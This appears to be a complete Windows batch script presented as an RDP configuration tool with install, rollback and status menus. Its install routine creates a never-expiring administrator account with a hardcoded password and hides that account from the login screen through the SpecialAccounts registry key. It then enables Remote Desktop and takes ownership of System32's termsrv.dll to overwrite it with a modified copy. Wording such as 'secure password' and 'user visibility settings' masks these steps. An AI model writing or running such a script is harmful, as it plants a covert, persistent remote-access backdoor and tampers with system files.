@echo off
:: =============================================
:: RDP Configuration Script with Menu System
:: Version: 2.0
:: =============================================

SET LOG_FILE=%SystemDrive%\RDP_Config_%DATE:~-4,4%%DATE:~-10,2%%DATE:~-7,2%.log
SET BACKUP_DIR=%SystemDrive%\Windows_System32_Backup_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
SET DLL_SOURCE=termsrv.dll
SET DLL_TARGET=%windir%\System32\termsrv.dll
SET TEMP_USER=RDPTempAdmin
SET TEMP_PASSWORD=#SecureTempPwd123!
SET REGISTRY_BACKUP=%SystemDrive%\RDP_Registry_Backup_%DATE:~-4,4%%DATE:~-10,2%%DATE:~-7,2%.reg

:MAIN_MENU
cls
echo =============================================
echo    RDP Configuration Script v2.0
echo =============================================
echo.
echo Please select an option:
echo.
echo [1] Install/Configure RDP
echo [2] Rollback/Uninstall RDP Configuration
echo [3] View Current Status
echo [4] Exit
echo.
set /p choice="Enter your choice (1-4): "

if "%choice%"=="1" goto INSTALL_RDP
if "%choice%"=="2" goto ROLLBACK_RDP
if "%choice%"=="3" goto VIEW_STATUS
if "%choice%"=="4" goto EXIT_SCRIPT
echo Invalid choice. Please try again.
pause
goto MAIN_MENU

:INSTALL_RDP
cls
echo =============================================
echo Installing RDP Configuration
echo =============================================
echo.

:: Initialize logging
echo [%DATE% %TIME%] Starting RDP installation script >> %LOG_FILE%
echo [%DATE% %TIME%] Script version: 2.0 >> %LOG_FILE%
echo [%DATE% %TIME%] System: %COMPUTERNAME% >> %LOG_FILE%
echo [%DATE% %TIME%] Windows Version: %OS% >> %LOG_FILE%

:: Verify administrative privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: This script requires elevated privileges. Aborting. >> %LOG_FILE%
    echo ERROR: Please run this script as Administrator.
    pause
    goto MAIN_MENU
)

:: Backup current registry settings
echo [%DATE% %TIME%] Backing up registry settings >> %LOG_FILE%
echo Backing up registry settings...
reg export "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" "%REGISTRY_BACKUP%" /y >> %LOG_FILE% 2>&1
reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" "%REGISTRY_BACKUP%_UserList" /y >> %LOG_FILE% 2>&1

:: Create temporary administrative account (with secure password)
echo [%DATE% %TIME%] Creating temporary administrative account >> %LOG_FILE%
echo Creating temporary administrative account...
net user %TEMP_USER% %TEMP_PASSWORD% /ADD /Y /EXPIRES:NEVER /COMMENT:"Temporary RDP configuration account" >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to create user account >> %LOG_FILE%
    echo ERROR: Failed to create user account. Check log for details.
    pause
    goto MAIN_MENU
)

net localgroup Administrators %TEMP_USER% /ADD >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to add user to Administrators group >> %LOG_FILE%
    echo ERROR: Failed to add user to Administrators group.
    pause
    goto MAIN_MENU
)

:: Enable Remote Desktop Connections
echo [%DATE% %TIME%] Configuring Remote Desktop settings >> %LOG_FILE%
echo Enabling Remote Desktop connections...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to enable RDP connections >> %LOG_FILE%
    echo ERROR: Failed to enable RDP connections.
    pause
    goto MAIN_MENU
)

:: Configure user visibility settings
echo Configuring user visibility settings...
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %TEMP_USER% /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] WARNING: Could not configure user visibility settings >> %LOG_FILE%
    echo WARNING: Could not configure user visibility settings.
)

:: Backup original DLL
echo [%DATE% %TIME%] Creating System32 backup directory >> %LOG_FILE%
echo Creating backup directory...
mkdir "%BACKUP_DIR%" >> %LOG_FILE% 2>&1

echo [%DATE% %TIME%] Backing up original termsrv.dll >> %LOG_FILE%
echo Backing up original termsrv.dll...
copy "%DLL_TARGET%" "%BACKUP_DIR%\termsrv.dll.backup" >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] WARNING: Could not create backup of termsrv.dll >> %LOG_FILE%
    echo WARNING: Could not create backup of termsrv.dll.
)

:: Deploy modified DLL (only if source exists)
if exist "%DLL_SOURCE%" (
    echo [%DATE% %TIME%] Deploying modified termsrv.dll >> %LOG_FILE%
    echo Deploying modified termsrv.dll...
    takeown /f "%DLL_TARGET%" >> %LOG_FILE% 2>&1
    icacls "%DLL_TARGET%" /grant Administrators:F >> %LOG_FILE% 2>&1
    xcopy "%DLL_SOURCE%" "%DLL_TARGET%" /Y /Q /R /K /H >> %LOG_FILE% 2>&1
    IF %ERRORLEVEL% NEQ 0 (
        echo [%DATE% %TIME%] ERROR: Failed to deploy modified DLL >> %LOG_FILE%
        echo ERROR: Failed to deploy modified DLL.
        pause
        goto MAIN_MENU
    )
    
    :: Verify DLL deployment
    fc "%DLL_SOURCE%" "%DLL_TARGET%" >nul
    IF %ERRORLEVEL% NEQ 0 (
        echo [%DATE% %TIME%] ERROR: DLL verification failed >> %LOG_FILE%
        echo ERROR: DLL verification failed.
        pause
        goto MAIN_MENU
    )
) else (
    echo [%DATE% %TIME%] WARNING: Source DLL not found, skipping DLL modification >> %LOG_FILE%
    echo WARNING: Source DLL not found, skipping DLL modification.
)

:: Finalize configuration
echo [%DATE% %TIME%] Restarting Terminal Services >> %LOG_FILE%
echo Restarting Terminal Services...
net stop TermService /Y >> %LOG_FILE% 2>&1
net start TermService >> %LOG_FILE% 2>&1

echo [%DATE% %TIME%] RDP installation completed successfully >> %LOG_FILE%
echo.
echo =============================================
echo RDP Configuration Complete
echo =============================================
echo - Temporary admin account created: %TEMP_USER%
echo - Registry backup: %REGISTRY_BACKUP%
echo - System32 backup: %BACKUP_DIR%
echo - Log file: %LOG_FILE%
echo =============================================
echo IMPORTANT: Change the temporary password immediately!
echo =============================================
pause
goto MAIN_MENU

:ROLLBACK_RDP
cls
echo =============================================
echo Rolling Back RDP Configuration
echo =============================================
echo.
echo This will:
echo - Remove the temporary user account
echo - Disable RDP connections
echo - Restore original system files (if available)
echo.
set /p confirm="Are you sure you want to rollback? (Y/N): "
if /i not "%confirm%"=="Y" goto MAIN_MENU

:: Initialize logging
echo [%DATE% %TIME%] Starting RDP rollback script >> %LOG_FILE%

:: Verify administrative privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: This script requires elevated privileges. Aborting. >> %LOG_FILE%
    echo ERROR: Please run this script as Administrator.
    pause
    goto MAIN_MENU
)

:: Remove temporary user account
echo [%DATE% %TIME%] Removing temporary user account >> %LOG_FILE%
echo Removing temporary user account...
net user %TEMP_USER% /DELETE >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] WARNING: Could not delete user account (may not exist) >> %LOG_FILE%
    echo WARNING: Could not delete user account (may not exist).
)

:: Disable Remote Desktop Connections
echo [%DATE% %TIME%] Disabling Remote Desktop connections >> %LOG_FILE%
echo Disabling Remote Desktop connections...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to disable RDP connections >> %LOG_FILE%
    echo ERROR: Failed to disable RDP connections.
)

:: Remove user visibility registry entry
echo [%DATE% %TIME%] Cleaning up registry entries >> %LOG_FILE%
echo Cleaning up registry entries...
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %TEMP_USER% /f >> %LOG_FILE% 2>&1

:: Restore original DLL if backup exists
echo [%DATE% %TIME%] Looking for DLL backup >> %LOG_FILE%
for /d %%i in (%SystemDrive%\Windows_System32_Backup_*) do (
    if exist "%%i\termsrv.dll.backup" (
        echo [%DATE% %TIME%] Found backup at %%i >> %LOG_FILE%
        echo Restoring original termsrv.dll from backup...
        takeown /f "%DLL_TARGET%" >> %LOG_FILE% 2>&1
        icacls "%DLL_TARGET%" /grant Administrators:F >> %LOG_FILE% 2>&1
        copy "%%i\termsrv.dll.backup" "%DLL_TARGET%" /Y >> %LOG_FILE% 2>&1
        IF %ERRORLEVEL% EQU 0 (
            echo [%DATE% %TIME%] Successfully restored original DLL >> %LOG_FILE%
            echo Successfully restored original DLL.
        ) else (
            echo [%DATE% %TIME%] ERROR: Failed to restore original DLL >> %LOG_FILE%
            echo ERROR: Failed to restore original DLL.
        )
        goto :dll_restore_done
    )
)
echo [%DATE% %TIME%] No DLL backup found >> %LOG_FILE%
echo No DLL backup found to restore.
:dll_restore_done

:: Restart Terminal Services
echo [%DATE% %TIME%] Restarting Terminal Services >> %LOG_FILE%
echo Restarting Terminal Services...
net stop TermService /Y >> %LOG_FILE% 2>&1
net start TermService >> %LOG_FILE% 2>&1

echo [%DATE% %TIME%] RDP rollback completed >> %LOG_FILE%
echo.
echo =============================================
echo RDP Rollback Complete
echo =============================================
echo - Temporary user account removed
echo - RDP connections disabled
echo - Original files restored (if available)
echo - Log file: %LOG_FILE%
echo =============================================
pause
goto MAIN_MENU

:VIEW_STATUS
cls
echo =============================================
echo Current RDP Configuration Status
echo =============================================
echo.

:: Check if RDP is enabled
echo Checking RDP status...
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 2>nul | find "0x0" >nul
if %ERRORLEVEL% EQU 0 (
    echo RDP Status: ENABLED
) else (
    echo RDP Status: DISABLED
)

:: Check if temporary user exists
echo.
echo Checking temporary user account...
net user %TEMP_USER% >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo Temporary User: EXISTS (%TEMP_USER%)
) else (
    echo Temporary User: NOT FOUND
)

:: Check for backups
echo.
echo Checking for backup files...
if exist %SystemDrive%\Windows_System32_Backup_* (
    echo System32 Backups: FOUND
    for /d %%i in (%SystemDrive%\Windows_System32_Backup_*) do echo   - %%i
) else (
    echo System32 Backups: NOT FOUND
)

if exist %SystemDrive%\RDP_Registry_Backup_*.reg (
    echo Registry Backups: FOUND
    for %%i in (%SystemDrive%\RDP_Registry_Backup_*.reg) do echo   - %%i
) else (
    echo Registry Backups: NOT FOUND
)

echo.
echo =============================================
pause
goto MAIN_MENU

:EXIT_SCRIPT
echo.
echo Thank you for using RDP Configuration Script!
echo.
pause
exit /b 0
